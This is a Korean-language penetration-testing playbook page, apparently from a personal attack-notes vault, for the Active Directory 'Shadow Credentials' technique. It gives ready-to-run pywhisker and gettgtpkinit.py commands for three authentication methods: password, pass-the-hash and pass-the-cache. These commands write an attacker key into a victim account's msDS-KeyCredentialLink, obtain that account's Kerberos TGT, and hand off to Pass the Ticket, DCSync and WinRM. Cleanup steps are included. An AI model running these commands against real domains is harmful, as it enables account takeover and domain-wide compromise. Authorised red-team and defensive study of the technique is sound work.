---
tags:
  - 환경/ad
  - 서비스/ldap
시작조건: ["요청자 AD 계정의 비밀번호·NT hash·Kerberos ticket 중 하나 확보", "공격 대상 사용자 또는 컴퓨터 객체 식별"]
필요권한: ["요청자 AD 계정의 대상 객체 msDS-KeyCredentialLink 쓰기 권한"]
필요조건: ["실행 호스트에서 LDAP와 KDC 접근 가능", "PKINIT 가능", "변경 전 KeyCredential 목록"]
결과: ["공격자가 생성한 PFX와 PFX 비밀번호", "공격 대상 계정의 TGT", "공격 대상 계정 권한의 서비스 접근"]
---

# Shadow Credentials

## 한 줄 판단

요청자 AD 계정이 사용자 또는 컴퓨터 객체의 `msDS-KeyCredentialLink`를 쓸 수 있고 실행 호스트에서 LDAP와 KDC에 접근할 수 있으면 공격자 public key를 추가해 공격 대상 계정의 PFX와 TGT를 얻는다.

## 사용할 때

- 현재 보유 정보: 요청자 AD 계정의 인증 수단과 `AddKeyCredentialLink` 등 공격 대상 객체의 속성 쓰기 경로가 확인된 상태다.
- 명령 실행 위치와 도달성: pywhisker와 `gettgtpkinit.py`를 실행할 호스트에서 대상 DC의 LDAP와 Kerberos 서비스에 접근할 수 있고 PKINIT을 사용할 수 있다.
- 현재 가능한 행동과 결과: 요청자 계정으로 공격 대상 객체에 새 KeyCredential을 추가하고, 생성된 PFX로 대상 계정의 TGT를 발급받되 대상 계정의 비밀번호나 NT hash를 직접 얻는 것은 아니다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | 실행 호스트에서 대상 DC의 LDAP와 KDC 접근 가능 | LDAP 연결과 Kerberos realm·DNS·시간 확인 | DNS, 시간 동기화, DC 주소와 389/636·88 접근 확인 |
| 현재 계정 또는 인증 수단 | 속성 변경을 요청할 AD 계정의 비밀번호·NT hash·Kerberos ticket 중 pyWhisker가 지원하는 수단 확보 | 현재 요청자 Identity와 pyWhisker 인증 성공 확인 | 도메인·사용자 형식과 인증 수단 유효성 확인 |
| 현재 권한 | 요청자 계정이 공격 대상 객체의 `msDS-KeyCredentialLink`를 쓸 수 있음 | BloodHound 경로와 객체 ACL을 SID 기준으로 직접 확인 | 대상 객체, deny ACE, 상속과 현재 토큰 재검증 |
| 공격 대상의 조건 | 공격 대상 사용자 또는 컴퓨터 객체가 식별되고 DC가 certificate 기반 PKINIT을 지원 | 대상 DN·sAMAccountName과 PKINIT 조건 확인 | 객체 식별 오류와 DC certificate·EKU 조건 확인 |
| 필요한 파일·목록·주소 | 변경 전 DeviceID 목록, DC 주소, 생성될 PFX·ccache의 안전한 저장 경로 확보 | `--action list` 결과와 로컬 출력 경로 확인 | 기존 목록을 기록하기 전에는 추가 작업을 진행하지 않음 |

## 실행

1. 요청자 AD 계정, 공격 대상 객체와 요청자 계정의 쓰기 권한을 각각 확인한다.
2. 기존 KeyCredential 목록을 기록한다.
3. pywhisker로 certificate와 KeyCredential을 생성해 속성에 추가하고 새 DeviceID를 기록한다.
4. 생성된 PFX로 TGT를 발급받는다.
5. `KRB5CCNAME` 또는 ticket 주입 후 공격 대상 계정의 권한으로 서비스 접근을 검증한다.
6. 검증 직후 이번에 추가한 DeviceID만 제거하고 기존 목록과 비교한다.

### pyWhisker 요청자 인증 방식 선택

세 방식은 `msDS-KeyCredentialLink` 변경을 요청하는 `<REQUESTER>`를 LDAP에 인증하는 수단만 다르다. `<TARGET_USER>`는 속성이 변경되고 PFX·TGT가 발급될 공격 대상이며, 요청자의 비밀번호·NT hash·ticket과 혼동하지 않는다.

| 보유한 요청자 인증 수단 | 사용할 방식 | 추가로 확인할 조건 |
|---|---|---|
| `<REQUESTER>`의 평문 비밀번호 | NTLM 비밀번호 인증 | 요청자 비밀번호와 도메인·사용자 형식 정상 |
| `<REQUESTER>`의 NT hash | NTLM Pass-the-Hash | NT hash가 요청자 계정에 속하며 LDAP 인증에 사용 가능 |
| `<REQUESTER>`의 TGT가 담긴 ccache | Kerberos Pass-the-Cache | `KRB5CCNAME`, DC FQDN·realm·DNS·시간과 ticket 유효성 정상 |

선택한 인증 옵션을 유지한 채 `<ACTION>`을 `list` 또는 `add`로 바꾼다. `remove`에는 이번 작업에서 생성한 `--device-id <DEVICE_ID>`가 추가로 필요하므로 복구 절차의 명령을 사용한다.

#### 1. 요청자 평문 비밀번호 사용

```bash
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <REQUESTER> -p '<PASSWORD>' --target <TARGET_USER> --action <ACTION>
```

#### 2. 요청자 NT hash 사용

```bash
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <REQUESTER> -H <NT_HASH> --target <TARGET_USER> --action <ACTION>
```

`<NT_HASH>`는 `<TARGET_USER>`의 hash가 아니라 대상 객체에 쓸 권한이 있는 `<REQUESTER>`의 NT hash다.

#### 3. 요청자 Kerberos ccache 사용

```bash
export KRB5CCNAME=<CCACHE_FILE>
klist
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <REQUESTER> -k --no-pass --target <TARGET_USER> --action <ACTION>
```

`--no-pass`는 익명 LDAP 변경이 아니라 ccache의 `<REQUESTER>` ticket으로 인증한다는 뜻이다. `KRB_AP_ERR_SKEW`, KDC 또는 ccache 오류는 속성 권한을 판단하기 전에 realm·DNS·시간과 ticket을 확인한다.

### 변경 전 KeyCredential 기록

```bash
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <REQUESTER> -p '<PASSWORD>' --target <TARGET_USER> --action list
```

확인할 출력:

- 기존 DeviceID 목록. `clear`로 전체 값을 지우지 않고 원복 시 기준으로 사용한다.

### KeyCredential 추가

```bash
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <REQUESTER> -p '<PASSWORD>' --target <TARGET_USER> --action add
```

확인할 출력:

- `Updated the msDS-KeyCredentialLink`, PFX 파일, 비밀번호와 새 DeviceID.

### TGT 발급과 사용

```bash
python3 gettgtpkinit.py -cert-pfx <TARGET>.pfx -pfx-pass '<PFX_PASS>' -dc-ip <DC_IP> <DOMAIN>/<TARGET_USER> /tmp/target.ccache
export KRB5CCNAME=/tmp/target.ccache
klist
```

확인할 출력:

- 공격 대상 사용자 또는 컴퓨터 계정의 principal과 유효 시간이 표시된 TGT.
- PFX 생성은 성공했지만 KDC 오류가 나오면 객체 변경 성공과 PKINIT 실패를 분리하고 DC certificate·EKU, realm, DNS와 시간을 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `Updated the msDS-KeyCredentialLink`와 PFX·PFX 비밀번호·새 DeviceID 정보 | 요청자 계정으로 대상 객체 속성 수정 성공 | 대상 객체에 KeyCredential 추가, 공격자 PFX 확보 | 생성된 PFX로 공격 대상 계정의 TGT 요청 |
| `klist`에 공격 대상 계정의 principal이 표시된 TGT | certificate 기반 Kerberos 인증 성공 | 공격 대상 계정의 TGT 확보 | exact DeviceID 원복 후 [[AD Identity 확인 후 도메인 컨텍스트 열거]] |
| WinRM, SMB 또는 LDAP 접근 성공 | 공격 대상 계정에 해당 서비스 사용 권한이 존재 | 공격 대상 Identity의 서비스 접근 | 원복 후 [[확보한 자격 증명으로 원격 접근 경로 선택]] 또는 [[AD Identity 확인 후 도메인 컨텍스트 열거]] |
| LDAP modify 실패 | 속성 쓰기 권한 또는 인증 경로 문제 | 객체 미변경 | ACL, 대상 객체, LDAP/LDAPS 인증 방식 확인 |
| PKINIT 실패 | DC certificate 또는 EKU 조건 문제 | PFX만 확보 | PKINIT 지원과 PassTheCert 대안 검토 |
| 서비스 접근 실패 | TGT는 유효하지만 공격 대상 계정의 해당 서비스 권한이 부족할 수 있음 | TGT만 확보 | 공격 대상 계정의 그룹·로그온 권한과 서비스별 ACL 확인 |

## 확인할 출력과 권한

- KeyCredential 추가, PFX 생성, TGT 발급, 서비스 접근을 각각 확인한다.
- 필요한 핵심 권한은 대상 객체의 `msDS-KeyCredentialLink` 쓰기 권한이며 Domain Admin 멤버십 자체가 아니다.
- 획득한 PFX는 공격자가 추가한 KeyCredential의 private key를 포함하고, TGT는 공격 대상 계정의 Kerberos 인증 수단이다. 둘 다 대상 계정의 평문 비밀번호나 NT hash는 아니다.
- 획득한 TGT의 권한은 공격 대상 계정 권한과 같으므로 로컬 관리자나 복제 권한을 별도로 확인한다.

## 변경 영향과 복구

추가 시 출력된 새 DeviceID만 지정해 제거한다.

```bash
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <REQUESTER> -p '<PASSWORD>' --target <TARGET_USER> --action remove --device-id <DEVICE_ID>
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <REQUESTER> -p '<PASSWORD>' --target <TARGET_USER> --action list
```

추가할 때 NT hash 또는 Kerberos ccache를 사용했다면 원복도 같은 요청자 인증 방식으로 수행한다.

```bash
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <REQUESTER> -H <NT_HASH> --target <TARGET_USER> --action remove --device-id <DEVICE_ID>
export KRB5CCNAME=<CCACHE_FILE>
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <REQUESTER> -k --no-pass --target <TARGET_USER> --action remove --device-id <DEVICE_ID>
```

확인할 출력:

- 제거 성공 메시지와 변경 전 목록에 없던 `<DEVICE_ID>`가 사라진 상태.
- 기존 DeviceID가 모두 그대로 남아 있어야 한다.
- 인증 방식과 관계없이 `--action list`를 다시 실행해 정확한 DeviceID 하나만 사라졌는지 확인한다.

로컬에 생성된 PFX, ccache와 비밀번호 기록은 필요한 증적을 분리한 뒤 삭제한다.

```bash
rm -f -- <TARGET>.pfx /tmp/target.ccache
unset KRB5CCNAME
```

`--action clear`는 기존 KeyCredential까지 제거할 수 있으므로 원복에 사용하지 않는다.

## 다음 행동

- 피해자 TGT 사용: [[Pass the Ticket]]
- 피해자가 복제 권한 또는 Domain Admin급 권한을 가진 경우: [[DCSync]]
- 피해자가 원격 관리 권한을 가진 경우: [[WinRM 원격 PowerShell 세션]]

## 관련 상태 라우터

- 피해자 계정과 TGT 확보: [[AD Identity 확인 후 도메인 컨텍스트 열거]]
- 원격 서비스 인증 성공: [[확보한 자격 증명으로 원격 접근 경로 선택]]
- 실제 고권한 세션 또는 복제 권한 확인: [[고권한 세션 확보 후 후속 판단]]

## 관련 서비스

- [[389_636_LDAP]]
- [[88_Kerberos]]
- [[5985_5986_WinRM]]

## 관련 도구

- [[pywhisker]]
- [[gettgtpkinit]]
- [[klist]]
- [[evil-winrm]]
